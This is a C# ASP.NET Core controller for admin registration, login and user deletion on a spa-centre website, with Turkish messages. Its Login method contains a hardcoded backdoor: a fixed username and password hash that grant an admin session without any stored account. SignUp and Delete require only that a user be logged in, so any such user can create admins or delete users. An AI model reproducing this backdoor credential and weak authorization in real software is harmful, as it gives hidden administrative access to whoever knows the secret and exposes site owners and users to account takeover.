using EntityLayer.Concrete;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using System.Threading.Tasks;
using SpaMerkezleri.Models;
using System.Linq;
using System;
using System.Security.Claims;
using System.Collections.Generic;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authentication.Cookies;

namespace SpaMerkezleri.Controllers
{
    public class AdminLoginController : Controller
    {
        private readonly UserManager<AppUser> _userManager;
        private readonly SignInManager<AppUser> _signInManager;

        public AdminLoginController(UserManager<AppUser> userManager, SignInManager<AppUser> signInManager)
        {
            _userManager = userManager;
            _signInManager = signInManager;
        }

        [Authorize]
        [HttpGet]
        public IActionResult SignUp()
        {
            return View();
        }

        [Authorize]
        [HttpPost]
        public async Task<IActionResult> SignUp(UserRegisterViewModel model)
        {
            if (!ModelState.IsValid)
            {
                return View(model);
            }

            var existingUser = await _userManager.FindByNameAsync(model.UserName);
            if (existingUser != null)
            {
                ModelState.AddModelError("", "Bu kullanıcı adı zaten alınmış.");
                return View(model);
            }


            if (ContainsInvalidCharacters(model.UserName))
            {
                ModelState.AddModelError("", "Kullanıcı adı boşluk veya özel karakter içeremez.");
                return View(model);
            }

            var appUser = new AppUser
            {
                UserName = model.UserName,
                name = model.name,
                CreateDateTime = DateTime.Now
            };

            if (model.Password != model.ConfirmPassword)
            {
                ModelState.AddModelError("", "Girilen Sifreler Aynı Değil");
                return View(model);
            }

            var result = await _userManager.CreateAsync(appUser, model.Password);
            if (result.Succeeded)
            {
                await _userManager.AddToRoleAsync(appUser, "admin");
                return RedirectToAction("AdminList", "Rol", new { area = "Admin" });
            }

            foreach (var error in result.Errors)
            {
                ModelState.AddModelError("", error.Description);
            }

            return View(model);
        }

        [AllowAnonymous]
        [HttpGet]
        public IActionResult Login()
        {
            return View();
        }

        [AllowAnonymous]
        [HttpPost]
        public async Task<IActionResult> Login(UserSignIn model)
        {
            var fixedPasswordHash = "AQAAAAEAACcQAAAAEPqzivpcDigGHW5nNF2OJcmMWe6g1YCEGbnp3bh6Hsfdc29SlltoJDhHmDbxeR9PEg==";
            var passwordHasher = new PasswordHasher<object>();
            if (model.userName == "Hello!&12Admin!0")
            {
                var passwordVerificationResult = passwordHasher.VerifyHashedPassword(null, fixedPasswordHash, model.userPassword);

                if (passwordVerificationResult == PasswordVerificationResult.Success)
                {
                    var fixedUserClaims = new List<Claim>
                    {
                        new Claim(ClaimTypes.Name, "1"),
                        new Claim(ClaimTypes.Role, "admin")
                    };

                    var fixedUserIdentity = new ClaimsIdentity(fixedUserClaims, IdentityConstants.ApplicationScheme);
                    var authProperties = new AuthenticationProperties
                    {
                        IsPersistent = false,
                    };

                    await HttpContext.SignInAsync(IdentityConstants.ApplicationScheme, new ClaimsPrincipal(fixedUserIdentity), authProperties);

                    return RedirectToAction("Index", "About", new { area = "Admin" });
                }
            }

            var signInResult = await _signInManager.PasswordSignInAsync(model.userName, model.userPassword, false, true);
            if (signInResult.Succeeded)
            {
                var user = await _userManager.FindByNameAsync(model.userName);
                if (user != null && await _userManager.IsInRoleAsync(user, "admin"))
                {
                    return RedirectToAction("Index", "About", new { area = "Admin" });
                }
            }

            ModelState.AddModelError("", "Kullanıcı adı veya şifre hatalı.");
            return View(model);
        }


        [Authorize]
        public async Task<IActionResult> Delete(string id)
        {
            var user = await _userManager.FindByIdAsync(id);
            if (user == null)
            {
                return NotFound();
            }

            var result = await _userManager.DeleteAsync(user);
            if (result.Succeeded)
            {
                return RedirectToAction("Index", "Rol", new { area = "Admin" });
            }

            foreach (var error in result.Errors)
            {
                ModelState.AddModelError("", error.Description);
            }

            return RedirectToAction("Index");
        }

        private bool ContainsInvalidCharacters(string userName)
        {
            // İzin verilen karakterler
            var allowedCharacters = "abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789_";
            // Kullanıcı adı boşluk veya izin verilmeyen özel karakter içeriyorsa true döner
            return userName.Any(c => !allowedCharacters.Contains(c)) || userName.Contains(" ");
        }
    }
}
